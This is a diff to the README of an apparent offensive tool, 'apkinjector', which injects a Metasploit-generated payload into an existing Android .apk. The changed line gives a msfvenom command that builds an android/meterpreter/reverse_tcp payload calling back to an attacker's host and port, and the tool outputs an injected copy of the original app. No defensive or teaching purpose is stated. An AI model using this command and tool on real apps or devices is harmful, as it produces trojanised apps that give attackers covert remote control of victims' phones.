@@ -25,7 +25,7 @@ apkinjector \<payload>.apk \<original>.apk<br>
 <br>
 <b>Input:</b><br>
 This script takes a msfgenerated payload as input along with an .apk you want to inject into.<br>
-To generate the payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT<PORT> -o \<payload>.apk<br>
+To generate the payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=\<IP> LPORT=\<PORT> -o \<payload>.apk<br>
 <br>
 <b>Output:</b><br>
 injected_\<original>.apk<br>
